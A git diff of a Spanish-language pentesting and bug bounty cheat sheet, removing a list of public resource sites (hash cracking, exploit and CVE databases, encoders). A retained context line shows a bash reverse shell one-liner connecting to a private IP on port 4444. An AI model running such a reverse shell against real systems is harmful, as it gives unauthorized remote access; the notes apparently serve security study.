@@ -323,38 +323,6 @@
    /bin/bash -c 'bash -i >& /dev/tcp/10.9.2.251/4444 0>&1'
    ``` 
 
-## 1.15.Sitios Web
-
-1. Para descifrar hashes de contraseñas débiles
-
-   ```bash
-   https://crackstation.net/
-   ```
-2. Para buscar exploit's
-
-   ```bash
-   https://www.exploit-db.com/exploits/
-   ```
-3. Para buscar CVE's
-
-   ```bash
-   https://nvd.nist.gov/vuln/search
-   ```
-   ```bash
-   https://cve.mitre.org/
-   ```
-   ```bash
-   https://www.cvedetails.com/
-   ```
-4. Para codificar y decodificar
-
-   ```bash
-   https://gchq.github.io/CyberChef/
-   ```
-   ```bash
-   https://appdevtools.com/base64-encoder-decoder
-   ```
-
 # ***II. Bug bounty - Notes***
 
 `Bug bounty notes` es una documento donde encontraras comandos para ayudarte rapidamente a realizar Bug bounty desde lo mas básico a lo avanzado.
